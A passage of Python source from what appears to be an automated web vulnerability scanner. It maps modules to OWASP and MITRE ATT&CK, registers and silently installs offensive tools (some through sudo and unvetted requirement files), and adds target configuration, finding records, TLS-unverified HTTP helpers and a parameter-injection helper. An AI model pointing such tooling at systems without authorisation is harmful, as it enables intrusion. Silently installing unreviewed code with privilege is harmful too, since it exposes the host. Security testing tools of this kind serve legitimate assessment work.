    "logging"          : ("A09","Logging & Monitoring Failures",  "T1562","Impair Defenses"),
    "spf_dmarc"        : ("A05","Security Misconfiguration",      "T1566","Phishing"),
    "takeover"         : ("A05","Security Misconfiguration",      "T1568","DNS Hijacking"),
    # ── OWASP API Security Top 10 (2023) ─────────────────────────────────────
    "api_bfla"         : ("API5","Broken Function Level Auth",    "T1078","Valid Accounts"),
    "api_excessive"    : ("API3","Broken Obj Property Level Auth","T1119","Automated Collection"),
    "api_inventory"    : ("API9","Improper Inventory Management", "T1213","Data from Info Repos"),
    "api_versioning"   : ("API9","Improper Inventory Management", "T1595","Active Scanning"),
    "business_logic"   : ("API6","Unsafe Business Flows",         "T1190","Exploit Public-Facing App"),
    # ── New Attack Modules ────────────────────────────────────────────────────
    "prototype_poll"   : ("A03","Injection",                      "T1059.007","JavaScript"),
    "deserialization"  : ("A08","Data Integrity Failures",        "T1190","Exploit Public-Facing App"),
    "http_smuggling"   : ("A05","Security Misconfiguration",      "T1557","Adversary-in-the-Middle"),
    "path_traversal"   : ("A01","Broken Access Control",          "T1083","File & Dir Discovery"),
    "type_juggling"    : ("A03","Injection",                      "T1190","Exploit Public-Facing App"),
    "ssi_injection"    : ("A03","Injection",                      "T1059","Command & Script Interpreter"),
    "xpath_injection"  : ("A03","Injection",                      "T1190","Exploit Public-Facing App"),
    "graphql_injection": ("A03","Injection",                      "T1190","Exploit Public-Facing App"),
    "log_injection"    : ("A09","Logging & Monitoring Failures",  "T1562","Impair Defenses"),
    "timing_attack"    : ("A07","Auth & Session Failures",        "T1110","Brute Force"),
    "s3_bucket"        : ("A05","Security Misconfiguration",      "T1530","Data from Cloud Storage"),
    "websocket"        : ("A05","Security Misconfiguration",      "T1071","Application Layer Protocol"),
    "wsdl_soap"        : ("A05","Security Misconfiguration",      "T1213","Data from Info Repos"),
    "broken_link"      : ("A05","Security Misconfiguration",      "T1189","Drive-by Compromise"),
    "cors_preflight"   : ("A05","Security Misconfiguration",      "T1071","Application Layer Protocol"),
    "cloud_metadata"   : ("A10","Server-Side Request Forgery",    "T1580","Cloud Infrastructure Discovery"),
    "regex_dos"        : ("A04","Insecure Design",                "T1499","Endpoint DoS"),
    "jwt_confusion"    : ("A07","Auth & Session Failures",        "T1550","Use Alt Auth Material"),
    "saml_issues"      : ("A07","Auth & Session Failures",        "T1550","Use Alt Auth Material"),
    "password_policy"  : ("A07","Auth & Session Failures",        "T1110","Brute Force"),
    "account_enum"     : ("A07","Auth & Session Failures",        "T1056.004","Web Portal Capture"),
    "error_fingerprint": ("A05","Security Misconfiguration",      "T1016","System Network Config"),
    # ── Additional API Security ───────────────────────────────────────────────
    "api2_broken_auth": ("API2","Broken Authentication",           "T1110","Brute Force"),
    "api4_resource"   : ("API4","Unrestricted Resource Consumption","T1499","Endpoint DoS"),
    "api8_misconfig"  : ("API8","Security Misconfiguration",        "T1595","Active Scanning"),
    "hsts_check"      : ("A02","Cryptographic Failures",           "T1040","Network Sniffing"),
    "method_override" : ("A05","Security Misconfiguration",        "T1190","Exploit Public-Facing App"),
    "cert_transparency": ("A05","Security Misconfiguration",       "T1595","Active Scanning"),
    "interactsh_oob"  : ("A03","Injection",                        "T1071","Application Layer Protocol"),
}

# ─────────────────────────────────────────────────────────────────────────────
# TOOL REGISTRY
# ─────────────────────────────────────────────────────────────────────────────
INSTALLABLE_TOOLS = {
    "subfinder"   :("SubFinder",    "go",  "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"),
    "httpx"       :("HTTPX",        "go",  "github.com/projectdiscovery/httpx/cmd/httpx@latest"),
    "dnsx"        :("DNSX",         "go",  "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"),
    "naabu"       :("Naabu",        "go",  "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"),
    "nuclei"      :("Nuclei",       "go",  "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"),
    "katana"      :("Katana",       "go",  "github.com/projectdiscovery/katana/cmd/katana@latest"),
    "gobuster"    :("GoBuster",     "go",  "github.com/OJ/gobuster/v3@latest"),
    "ffuf"        :("FFUF",         "go",  "github.com/ffuf/ffuf/v2@latest"),
    "gau"         :("GAU",          "go",  "github.com/lc/gau/v2/cmd/gau@latest"),
    "waybackurls" :("WaybackURLs",  "go",  "github.com/tomnomnom/waybackurls@latest"),
    "gospider"    :("GoSpider",     "go",  "github.com/jaeles-project/gospider@latest"),
    "subjs"       :("SubJS",        "go",  "github.com/lc/subjs@latest"),
    "hakrawler"   :("HakRawler",    "go",  "github.com/hakluke/hakrawler@latest"),
    "amass"       :("Amass",        "go",  "github.com/owasp-amass/amass/v4/...@master"),
    "dalfox"      :("DalFox",       "go",  "github.com/hahwul/dalfox/v2@latest"),
    "trufflehog"  :("TruffleHog",   "go",  "github.com/trufflesecurity/trufflehog/v3@latest"),
    "gitleaks"    :("GitLeaks",     "go",  "github.com/gitleaks/gitleaks/v8@latest"),
    "feroxbuster" :("FeroxBuster",  "go",  "github.com/epi052/feroxbuster@latest"),
    "subjack"     :("Subjack",      "go",  "github.com/haccer/subjack@latest"),
    "subzy"       :("Subzy",        "go",  "github.com/LukaSikic/subzy@latest"),
    "unfurl"      :("Unfurl",       "go",  "github.com/tomnomnom/unfurl@latest"),
    "anew"        :("Anew",         "go",  "github.com/tomnomnom/anew@latest"),
    "interactsh-client":("Interactsh","go","github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"),
    "curl"        :("cURL",         "apt", "curl"),
    "testssl.sh"  :("testssl.sh",   "git", "https://github.com/drwetter/testssl.sh.git"),
    "nikto"       :("Nikto",        "apt", "nikto"),
    "wafw00f"     :("WAFW00F",      "pip", "wafw00f"),
    "sslscan"     :("SSLScan",      "apt", "sslscan"),
    "sslyze"      :("SSLyze",       "pip", "sslyze"),
    "dirsearch"   :("DirSearch",    "pip", "dirsearch"),
    "arjun"       :("Arjun",        "pip", "arjun"),
    "paramspider" :("ParamSpider",  "pip", "paramspider"),
    "theHarvester":("theHarvester", "pip", "theHarvester"),
    "commix"      :("Commix",       "pip", "commix"),
    "dnsrecon"    :("DNSRecon",     "pip", "dnsrecon"),
    "wpscan"      :("WPScan",       "gem", "wpscan"),
    "sqlmap"      :("SQLMap",       "git", "https://github.com/sqlmapproject/sqlmap.git"),
    "XSStrike"    :("XSStrike",     "git", "https://github.com/s0md3v/XSStrike.git"),
    "sublist3r"   :("Sublist3r",    "git", "https://github.com/aboul3la/Sublist3r.git"),
    "tplmap"      :("TplMap",       "git", "https://github.com/epinna/tplmap.git"),
    "Corsy"       :("Corsy",        "git", "https://github.com/s0md3v/Corsy.git"),
    "jwt_tool"    :("JWT Tool",     "git", "https://github.com/ticarpi/jwt_tool.git"),
    "NoSQLMap"    :("NoSQLMap",     "git", "https://github.com/codingo/NoSQLMap.git"),
    "SSRFmap"     :("SSRFMap",      "git", "https://github.com/swisskyrepo/SSRFmap.git"),
    "Photon"      :("Photon",       "git", "https://github.com/s0md3v/Photon.git"),
}

ARSENAL_REPOS = {
    "nuclei-templates":"https://github.com/projectdiscovery/nuclei-templates.git",
    "sublist3r":"https://github.com/aboul3la/Sublist3r.git",
    "assetfinder":"https://github.com/tomnomnom/assetfinder.git",
    "theHarvester":"https://github.com/laramies/theHarvester.git",
    "nikto":"https://github.com/sullo/nikto.git",
    "joomscan":"https://github.com/OWASP/joomscan.git",
    "CMSeek":"https://github.com/Tuhinshubhra/CMSeek.git",
    "sqlmap":"https://github.com/sqlmapproject/sqlmap.git",
    "NoSQLMap":"https://github.com/codingo/NoSQLMap.git",
    "Ghauri":"https://github.com/r0oth3x49/ghauri.git",
    "XSStrike":"https://github.com/s0md3v/XSStrike.git",
    "LFISuite":"https://github.com/D35m0nd142/LFISuite.git",
    "tplmap":"https://github.com/epinna/tplmap.git",
    "SSTImap":"https://github.com/vladko312/SSTImap.git",
    "SSRFmap":"https://github.com/swisskyrepo/SSRFmap.git",
    "XSRFProbe":"https://github.com/0xInfection/XSRFProbe.git",
    "jwt_tool":"https://github.com/ticarpi/jwt_tool.git",
    "Corsy":"https://github.com/s0md3v/Corsy.git",
    "CORScanner":"https://github.com/chenjj/CORScanner.git",
    "Oralyzer":"https://github.com/r0075h3ll/Oralyzer.git",
    "graphqlmap":"https://github.com/swisskyrepo/GraphQLmap.git",
    "InQL":"https://github.com/doyensec/inql.git",
    "PayloadsAllTheThings":"https://github.com/swisskyrepo/PayloadsAllTheThings.git",
    "SecLists":"https://github.com/danielmiessler/SecLists.git",
    "fuzzdb":"https://github.com/fuzzdb-project/fuzzdb.git",
    "reconftw":"https://github.com/six2dez/reconftw.git",
    "dirsearch":"https://github.com/maurosoria/dirsearch.git",
    "log4j-scan":"https://github.com/fullhunt/log4j-scan.git",
    "wpscan_repo":"https://github.com/wpscanteam/wpscan.git",
    "Photon":"https://github.com/s0md3v/Photon.git",
    "s3scanner":"https://github.com/sa7mon/S3Scanner.git",
    "cloud_enum":"https://github.com/initstring/cloud_enum.git",
    "dnstwist":"https://github.com/elceef/dnstwist.git",
    "snallygaster":"https://github.com/hannob/snallygaster.git",
    "403bypasser":"https://github.com/yunemse48/403bypasser.git",
    "checkov":"https://github.com/bridgecrewio/checkov.git",
    "ModSecurity-CRS":"https://github.com/coreruleset/coreruleset.git",
    "owasp-juice-shop":"https://github.com/juice-shop/juice-shop.git",
    "sub404":"https://github.com/r3curs1v3-pr0xy/sub404.git",
}

# ─────────────────────────────────────────────────────────────────────────────
# INSTALLER  (fixed binary detection)
# ─────────────────────────────────────────────────────────────────────────────
def _is_installed(binary, method):
    """Check tool availability across all known installation paths."""
    global _EXT_PATH
    _EXT_PATH = _build_path()
    os.environ["PATH"] = _EXT_PATH

    # Standard PATH
    if shutil.which(binary, path=_EXT_PATH): return True

    # Explicit GOBIN (go install puts binaries here)
    gopath   = os.environ.get("GOPATH", str(Path.home()/"go"))
    gobin_p  = Path(gopath)/"bin"/binary
    if gobin_p.exists():
        gobin = str(Path(gopath)/"bin")
        if gobin not in _EXT_PATH:
            _EXT_PATH = gobin + os.pathsep + _EXT_PATH
            os.environ["PATH"] = _EXT_PATH
        return True

    # ~/.local/bin (pip --user)
    if (Path.home()/".local"/"bin"/binary).exists(): return True

    # Git-cloned tool directory
    if method == "git" and (TOOLS_DIR/binary).exists(): return True

    # pip module
    if method == "pip":
        for mod in [binary, binary.replace("-","_"), binary.lower()]:
            try:
                r = subprocess.run([sys.executable,"-m",mod,"--help"],
                                   capture_output=True, timeout=5)
                if r.returncode in (0,1,2): return True
            except Exception: pass

    # Common install locations
    for d in [Path("/usr/local/bin"),Path("/usr/bin"),Path("/bin")]:
        if (d/binary).exists(): return True

    return False

def run_cmd(cmd, timeout=300, env=None, cwd=None):
    try:
        e = env or os.environ.copy(); e["PATH"] = _EXT_PATH
        si = None
        if os.name=="nt":
            si=subprocess.STARTUPINFO(); si.dwFlags|=subprocess.STARTF_USESHOWWINDOW
        proc=subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,
                              text=True,startupinfo=si,env=e,cwd=cwd)
        out,err=proc.communicate(timeout=timeout)
        return (out+err).strip()
    except subprocess.TimeoutExpired: proc.kill(); return "TIMEOUT"
    except FileNotFoundError: return "NOT_FOUND"
    except Exception as ex: return str(ex)

def install_tool(binary, name, method, pkg, has_go, has_apt, has_brew, has_gem):
    """Install a tool and verify it's accessible afterwards."""
    global _EXT_PATH
    gopath = os.environ.get("GOPATH", str(Path.home()/"go"))
    gobin  = str(Path(gopath)/"bin")
    env    = os.environ.copy()
    env["PATH"] = _EXT_PATH
    env["GOPATH"] = gopath
    env["GOBIN"]  = gobin

    try:
        if method == "pip":
            # Try user install first, then system
            for pip_args in [
                [sys.executable,"-m","pip","install",pkg,"-q","--user"],
                [sys.executable,"-m","pip","install",pkg,"-q"],
            ]:
                try:
                    subprocess.check_call(pip_args,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        timeout=180)
                except Exception: pass
            # Refresh PATH after pip install
            _EXT_PATH = _build_path()
            os.environ["PATH"] = _EXT_PATH

        elif method == "go":
            if not has_go:
                return False
            try:
                result = subprocess.run(
                    ["go", "install", pkg],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    timeout=300, env=env)
                # Refresh PATH so we find the newly installed binary
                _EXT_PATH = _build_path()
                os.environ["PATH"] = _EXT_PATH
                # Explicit check: did the binary appear in GOBIN?
                gobin_path = Path(gobin) / binary
                if gobin_path.exists():
                    return True
                # Some binaries have different names
                if result.returncode == 0:
                    # Rebuild path and check again
                    _EXT_PATH = _build_path()
                    os.environ["PATH"] = _EXT_PATH
            except subprocess.TimeoutExpired:
                return False

        elif method == "apt":
            pkg_mgr = "apt-get" if has_apt else ("brew" if has_brew else None)
            if not pkg_mgr: return False
            install_cmd = (["sudo","apt-get","install","-y","-q",pkg]
                          if pkg_mgr == "apt-get" else ["brew","install",pkg])
            subprocess.check_call(install_cmd,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=180)

        elif method == "gem":
            if not has_gem: return False
            subprocess.check_call(["sudo","gem","install",pkg],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=180)

        elif method == "git":
            TOOLS_DIR.mkdir(exist_ok=True)
            dest = TOOLS_DIR / binary
            if not dest.exists():
                result = subprocess.run(
                    ["git","clone","--depth","1",pkg,str(dest)],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=180)
                if result.returncode != 0:
                    return False
            # Install Python requirements
            for reqfile in ["requirements.txt","req.txt","requirements-dev.txt"]:
                rf = dest / reqfile
                if rf.exists():
                    try:
                        subprocess.check_call(
                            [sys.executable,"-m","pip","install","-r",str(rf),"-q"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            timeout=180)
                    except Exception: pass
            return dest.exists()

    except Exception:
        pass

    # Final check with refreshed PATH
    _EXT_PATH = _build_path()
    os.environ["PATH"] = _EXT_PATH
    return _is_installed(binary, method)

def verify_and_install_tools(auto=True):
    print(); pulse_line("☠  INITIALISING OBSIDIAN v10.0 ARSENAL  ☠",C.PUR); print(); time.sleep(0.2)
    items=list(INSTALLABLE_TOOLS.items()); total=len(items); missing=[]
    has_go=cmd_exists("go"); has_apt=cmd_exists("apt-get")
    has_brew=cmd_exists("brew"); has_gem=cmd_exists("gem")
    for idx,(binary,(name,method,pkg)) in enumerate(items):
        progress_bar("Scanning Arsenal ...",total,idx+1); time.sleep(0.025)
        if not _is_installed(binary,method): missing.append((binary,name,method,pkg))
    progress_bar("Scanning Arsenal ...",total,total)
    print(f"\n\n  {C.GRN}{'━'*52}{C.RST}")
    print(f"  {C.GRN}✔  Ready   : {total-len(missing)}{C.RST}")
    print(f"  {C.RED}✗  Missing : {len(missing)}{C.RST}")
    if not has_go: print(f"  {C.YLW}⚠  go not found — GO tools need manual install{C.RST}")
    print(f"  {C.GRN}{'━'*52}{C.RST}\n"); time.sleep(0.3)
    if missing and auto:
        # Separate by install method so we show clear categories
        go_tools  = [(b,n,m,p) for b,n,m,p in missing if m=="go"]
        pip_tools = [(b,n,m,p) for b,n,m,p in missing if m=="pip"]
        git_tools = [(b,n,m,p) for b,n,m,p in missing if m=="git"]
        apt_tools = [(b,n,m,p) for b,n,m,p in missing if m in("apt","gem")]

        if not has_go and go_tools:
            print(f"  {C.YLW}⚠  go not installed — {len(go_tools)} GO tools unavailable{C.RST}")
            print(f"  {C.DIM}  Install go from https://go.dev/dl/ then re-run{C.RST}")
            for _,name,_,_ in go_tools:
                print(f"  {C.DIM}  ~  {name} — requires go{C.RST}")
            # Remove go tools from missing so we don't try them
            missing = [t for t in missing if t[2] != "go"]

        if missing:
            print(f"\n  {C.PUR}{C.BLD}☠  DEPLOYING MISSING TOOLS  ☠{C.RST}\n")
            for binary,name,method,pkg in missing:
                if method=="gem" and not has_gem:
                    print(f"  {C.DIM}  ~  {name} — gem required{C.RST}"); continue

                ev=threading.Event()
                thr=threading.Thread(
                    target=spinner_task,
                    args=(f"Installing {name} via {method.upper()} ...", ev, C.PUR),
                    daemon=True)
                thr.start()
                ok=install_tool(binary,name,method,pkg,has_go,has_apt,has_brew,has_gem)
                ev.set(); thr.join()

                if ok:
                    logger.log(name, "Installed successfully", "SUCCESS")
                else:
                    print(f"  {C.YLW}  ⚠  {name} — install failed, module will skip{C.RST}")
    print(); pulse_line("☠  ARSENAL READY  ☠",C.GRN); print(); time.sleep(0.3)

def clone_arsenal_repos():
    clr(); show_banner(); menu_title("📦  CLONING ARSENAL REPOS")
    TOOLS_DIR.mkdir(exist_ok=True)
    if not cmd_exists("git"): print(f"  {C.RED}✗  git not found.{C.RST}\n"); prompt("  ┗━━► ENTER...",C.DIM); return
    items=list(ARSENAL_REPOS.items()); total=len(items)
    cloned=skipped=failed=0
    print(f"  {C.WHT}Total repos: {C.GRN}{total}{C.RST}\n")
    def clone_one(item):
        name,url=item; dest=TOOLS_DIR/name
        if dest.exists(): return "skip"
        try:
            subprocess.call(["git","clone","--depth","1",url,str(dest)],
                stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,timeout=120)
            return "ok" if dest.exists() else "fail"
        except: return "fail"
    with ThreadPoolExecutor(max_workers=6) as ex:
        futures={ex.submit(clone_one,item):item[0] for item in items}; done=0
        for future in as_completed(futures):
            done+=1; r=future.result()
            if r=="ok": cloned+=1
            elif r=="skip": skipped+=1
            else: failed+=1
            progress_bar("Cloning ...",total,done,36)
    print(f"\n\n  {C.GRN}✔ Cloned:{cloned}  ~Skipped:{skipped}  {C.RED}✗Failed:{failed}{C.RST}")
    print(); pulse_line("☠  DONE  ☠",C.GRN); print(); prompt("  ┗━━► ENTER...",C.DIM)

def show_tool_status():
    clr(); show_banner(); menu_title("⚙  TOOL STATUS")
    for n,ok in [("go",cmd_exists("go")),("apt",cmd_exists("apt-get")),("pip",True),
                 ("git",cmd_exists("git")),("gem",cmd_exists("gem"))]:
        print(f"    {C.GRN if ok else C.RED}{'✔' if ok else '✗'}  {n}{C.RST}")
    print()
    for binary,(name,method,_) in INSTALLABLE_TOOLS.items():
        ok=_is_installed(binary,method); st=f"{C.GRN}✔ READY{C.RST}" if ok else f"{C.RED}✗ MISSING{C.RST}"
        mc=C.GRN if method=="go" else C.CYN if method=="pip" else C.YLW if method=="apt" else C.PUR
        print(f"  {C.WHT}{name:<22}{C.RST}{mc}{method:<8}{C.RST}{st}")
    print(); menu_divider(); prompt("  ┗━━► ENTER...",C.DIM)

# ─────────────────────────────────────────────────────────────────────────────
# SCAN FORM
# ─────────────────────────────────────────────────────────────────────────────
def collect_scan_config():
    print(); menu_title("☠  CONFIGURE TARGET  ☠")
    while True:
        url=prompt("  ┣━━ TARGET URL :",C.PUR)
        if url:
            if not url.startswith(("http://","https://")): url="https://"+url; break
            else: break
        print(f"  {C.RED}  ✗  URL required.{C.RST}")
    proxy=prompt("  ┣━━ PROXY (blank=none) :",C.PUR) or None
    default=f"dd_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    out_raw=prompt(f"  ┣━━ OUTPUT (default:{default}) :",C.PUR); out_name=out_raw if out_raw else default
    html=prompt("  ┣━━ HTML REPORT? [Y/n] :",C.PUR).lower() not in("n","no")
    crawl=prompt("  ┣━━ ENABLE CRAWLER? [Y/n] :",C.PUR).lower() not in("n","no")
    try: threads=int(prompt(f"  ┣━━ THREADS [default:{THREADS}] :",C.PUR) or THREADS)
    except: threads=THREADS
    auto=prompt("  ┗━━ AUTO-INSTALL TOOLS? [Y/n] :",C.PUR).lower() not in("n","no")
    print(); menu_divider()
    for l,v in [("Target",url),("Proxy",proxy or "None"),("Output",out_name+".json"),
                ("HTML","Yes" if html else "No"),("Crawler","On" if crawl else "Off"),
                ("Threads",str(threads)),("Auto-Install","Yes" if auto else "No")]:
        print(f"  {C.WHT}  {l:<14}:{C.RST} {C.GRN}{v}{C.RST}")
    print(); menu_divider(); print()
    if prompt("  ┗━━► LAUNCH SCAN? [Y/n] :",C.GRN).lower() in("n","no"): return None
    return {"url":url,"proxy":proxy,"output":out_name+".json","html":html,
            "skip_crawl":not crawl,"auto_install":auto,"threads":threads}

def show_scan_start(url):
    clr(); show_banner(); print()
    pulse_line(f"☠  SCAN INITIATED: {url[:60]}  ☠",C.RED); print()
    for color,line in [
        (C.GRN, "  ▶  Establishing connection …"),
        (C.GRN, f"  ▶  Loading 69 detection modules …"),
        (C.PUR, "  ▶  Spawning scanner threads …"),
        (C.PUR, "  ▶  OWASP Web+API Top 10 | 29 MITRE ATT&CK techniques …"),
        (C.PUR, "  ▶  40+ external tools ready …"),
        (C.RED, "  ☠  OBSIDIAN v10.0 — 95 MODULES | CVSS v3.1 | MULTI-TARGET | ZERO-FP  ☠"),
    ]:
        typewrite(line,speed=0.013,color=color); time.sleep(0.08)
    print(); pulse_line("SCAN IN PROGRESS",C.YLW); print()

# ─────────────────────────────────────────────────────────────────────────────
# LOGGER
# ─────────────────────────────────────────────────────────────────────────────
_log_lock=threading.Lock()
QUIET=False                              # silence module console logging (report still records)
PAYLOAD_VARIANTS = 0                     # 0 = full payload set; >0 caps payloads/class (set by v10 engine from the profile)
def _variants(seq):
    """Cap an injection payload list to PAYLOAD_VARIANTS (0 = no cap)."""
    try: n = int(PAYLOAD_VARIANTS)
    except Exception: n = 0
    return seq[:n] if n and n > 0 else seq
_ANSI_RE=re.compile(r"\x1b\[[0-9;]*m")  # strip colour when output is piped/redirected
class Logger:
    ICONS={"INFO":f"{E}96m[*]{E}0m","SUCCESS":f"{E}92m[+]{E}0m","WARNING":f"{E}93m[!]{E}0m",
           "ERROR":f"{E}91m[-]{E}0m","CRITICAL":f"{E}91m{E}1m[☠]{E}0m","SKIP":f"{E}2m[~]{E}0m","TOOL":f"{E}95m[T]{E}0m"}
    def __init__(self): self.entries=[]
    def log(self,module,message,level="INFO"):
        ts=datetime.now().strftime("%H:%M:%S"); icon=self.ICONS.get(level,"[?]")
        mc=C.PUR if level in("CRITICAL","TOOL") else C.GRN if level=="SUCCESS" else C.CYN
        line=f"  [{C.DIM}{ts}{C.RST}] {icon} {mc}{C.BLD}{module:<18}{C.RST} {C.WHT}{message}{C.RST}"
        with _log_lock:
            self.entries.append(f"[{ts}] [{level}] {module}: {message}")
            if QUIET: return
            if not getattr(sys.stdout,"isatty",lambda:False)(): line=_ANSI_RE.sub("",line)
            print(line, flush=True)
logger=Logger()

# ─────────────────────────────────────────────────────────────────────────────
# FINDING MODEL  (with OWASP + MITRE tagging)
# ─────────────────────────────────────────────────────────────────────────────
class Finding:
    SEV_RANK={"Critical":5,"High":4,"Medium":3,"Low":2,"Info":1}
    def __init__(self,module,title,severity,description,recommendation,
                 url="",payload="",cwe="",tool="internal",evidence="",
                 confidence="High",owasp_id="",owasp_name="",
                 mitre_id="",mitre_technique=""):
        self.module=module; self.title=title; self.severity=severity
        self.description=description; self.recommendation=recommendation
        self.url=url; self.payload=payload; self.cwe=cwe; self.tool=tool
        self.evidence=evidence; self.confidence=confidence
        self.owasp_id=owasp_id; self.owasp_name=owasp_name
        self.mitre_id=mitre_id; self.mitre_technique=mitre_technique
        self.timestamp   = datetime.now().isoformat()
        self.cvss_score  = ""
        self.cvss_vector = ""
        self.cvss_rating = ""
    def to_dict(self): return self.__dict__

class FindingStore:
    def __init__(self): self._items=[]; self._lock=threading.Lock()
    def add(self,f):
        with self._lock: self._items.append(f)
    def extend(self,items):
        for f in (items or []): self.add(f)
    def all(self):
        return sorted(self._items,key=lambda f:Finding.SEV_RANK.get(f.severity,0),reverse=True)
    def by_severity(self,s): return [f for f in self._items if f.severity==s]
    def counts(self):
        return {s:len(self.by_severity(s)) for s in("Critical","High","Medium","Low","Info")}
    def risk_score(self):
        w={"Critical":10,"High":6,"Medium":3,"Low":1,"Info":0}
        return min(sum(w.get(f.severity,0) for f in self._items)*2,100)

def make_finding(module_key, title, severity, description, recommendation,
                 url="", payload="", cwe="", tool="internal",
                 evidence="", confidence="High") -> Finding:
    """Create a finding with automatic OWASP + MITRE tagging."""
    owasp_id=owasp_name=mitre_id=mitre_technique=""
    if module_key in OWASP_MITRE:
        owasp_id,owasp_name,mitre_id,mitre_technique = OWASP_MITRE[module_key]
    return Finding(module_key,title,severity,description,recommendation,
                   url=url,payload=payload,cwe=cwe,tool=tool,evidence=evidence,
                   confidence=confidence,owasp_id=owasp_id,owasp_name=owasp_name,
                   mitre_id=mitre_id,mitre_technique=mitre_technique)

# ─────────────────────────────────────────────────────────────────────────────
# HTTP HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def make_session(proxy=None):
    s=requests.Session(); s.headers.update({"User-Agent":DEFAULT_UA}); s.verify=False
    if proxy: s.proxies={"http":proxy,"https":proxy}
    return s

def safe_get(session,url,**kw):
    try: return session.get(url,timeout=TIMEOUT,allow_redirects=True,**kw)
    except: return None

def safe_post(session,url,**kw):
    try: return session.post(url,timeout=TIMEOUT,allow_redirects=False,**kw)
    except: return None

def get_domain(url): return urlparse(url).netloc.split(":")[0]
def extract_params(url): qs=urlparse(url).query; return list(parse_qs(qs).keys()) if qs else []

def inject_param(url,param,payload):
    p=urlparse(url); params=parse_qs(p.query,keep_blank_values=True)
    params[param]=[payload]
    return urlunparse(p._replace(query=urlencode(params,doseq=True)))

def entropy(s):
    if not s: return 0
    freq={}
    for c in s: freq[c]=freq.get(c,0)+1
    return -sum(p*math.log2(p) for p in (v/len(s) for v in freq.values()))

# ─────────────────────────────────────────────────────────────────────────────
# ══════════════════  OWASP TOP 10 2021 MODULES  ══════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────


# ─────────────────────────────────────────────────────────────────────────────
# EFFICIENCY ENGINE — baseline cache, dedup, adaptive rate, FP reduction
# ─────────────────────────────────────────────────────────────────────────────

class ScanContext:
    """
    Shared scan state: baseline cache, response dedup, adaptive rate control.
    Constructed once per run_scan() and passed into modules.
    """
    def __init__(self, target: str, session):
        self.target  = target
        self.session = session
        self._baseline_cache: dict = {}      # url -> requests.Response
        self._resp_hashes:    set  = set()   # sha1(body) seen in dir brute
        self._429_count:      int  = 0
        self._adaptive_delay: float = 0.0   # seconds between requests
        self._content_types:  dict = {}      # url -> Content-Type
        self._wildcard_hash:  str | None = None  # sha1 of wildcard response
        self._lock = __import__('threading').Lock()

    # ── Baseline ──────────────────────────────────────────────────────────────
    def baseline(self, url: str | None = None) -> "requests.Response | None":
        """Return cached baseline response; fetch if not cached."""
        key = url or self.target
        with self._lock:
            if key in self._baseline_cache:
                return self._baseline_cache[key]
        resp = safe_get(self.session, key)
        if resp:
            with self._lock:
                self._baseline_cache[key] = resp
        return resp

    def baseline_body(self, url: str | None = None) -> str:
        r = self.baseline(url)
        return r.text if r else ""

    def baseline_len(self, url: str | None = None) -> int:
        return len(self.baseline_body(url))

    # ── Canary collision guard ────────────────────────────────────────────────
    def canary_safe(self, canary: str, url: str | None = None) -> bool:
        """Return True only if canary does NOT appear in baseline."""
        return canary not in self.baseline_body(url)

    # ── Response deduplication ────────────────────────────────────────────────
    def is_duplicate_response(self, body: str) -> bool:
        """True if we've seen this response body before (same hash)."""
        h = __import__('hashlib').sha1(body.encode(errors='ignore')).hexdigest()
        with self._lock:
            if h in self._resp_hashes:
                return True
            self._resp_hashes.add(h)
            return False

    # ── Content-type gate ─────────────────────────────────────────────────────
    def is_html(self, url: str | None = None) -> bool:
        r = self.baseline(url)
        if not r: return False
        ct = r.headers.get("Content-Type","")
        return "text/html" in ct or "application/xhtml" in ct

    def is_json_api(self, url: str | None = None) -> bool:
        r = self.baseline(url)
        if not r: return False
        ct = r.headers.get("Content-Type","")
        return "json" in ct or "application/xml" in ct

    # ── Adaptive rate control ─────────────────────────────────────────────────
    def on_response(self, resp) -> None:
        """Called after each request — tracks 429s and adjusts delay."""
        if resp is None: return
        if resp.status_code == 429:
            with self._lock:
                self._429_count += 1
                self._adaptive_delay = min(self._adaptive_delay + 0.5, 5.0)
        elif resp.status_code < 500:
            with self._lock:
                self._adaptive_delay = max(self._adaptive_delay - 0.05, 0.0)

    def get_delay(self) -> float:
        return self._adaptive_delay

    def throttled_get(self, url: str, **kw):
        """GET with adaptive delay and 429 tracking."""
        d = self.get_delay()
        if d > 0: time.sleep(d)
        resp = safe_get(self.session, url, **kw)
        self.on_response(resp)
        return resp

    # ── Wildcard DNS guard ────────────────────────────────────────────────────
    def set_wildcard_hash(self, h: str) -> None:
        self._wildcard_hash = h

    def is_wildcard_response(self, body: str) -> bool:
        if not self._wildcard_hash: return False
        h = __import__('hashlib').sha1(body.encode(errors='ignore')).hexdigest()
        return h == self._wildcard_hash

    # ── Param smart-sort ──────────────────────────────────────────────────────
    @staticmethod
    def prioritise_params(params: list[str]) -> list[str]:
        """Sort params: numeric ID params first (higher SQLi/IDOR yield)."""
        HIGH = {"id","uid","pid","user_id","account_id","order_id","item_id",
                "product_id","doc_id","file_id","ref","oid","record_id"}
        MEDIUM = {"page","limit","offset","sort","order","cat","category",
                  "type","filter","search","q","query"}
        def rank(p):
            pl = p.lower()
            if pl in HIGH:   return 0
            if pl in MEDIUM: return 1
            return 2
        return sorted(params, key=rank)

    # ── Similarity gate ───────────────────────────────────────────────────────
    def similar_to_baseline(self, body: str, url: str | None = None,
                             threshold: float = 0.92) -> bool:
        """
        True if response body is very similar to baseline (difflib ratio ≥ threshold).
        Used to skip injection params that return near-identical content.
        Fast: only compare first 4096 chars.
        """
        import difflib
        bl = self.baseline_body(url)[:4096]
        b  = body[:4096]
        if not bl or not b: return False
        return difflib.SequenceMatcher(None, bl, b).quick_ratio() >= threshold


# Global scan context (set at run_scan start, used by all modules)
_scan_ctx: ScanContext | None = None

def get_ctx() -> ScanContext | None:
    return _scan_ctx


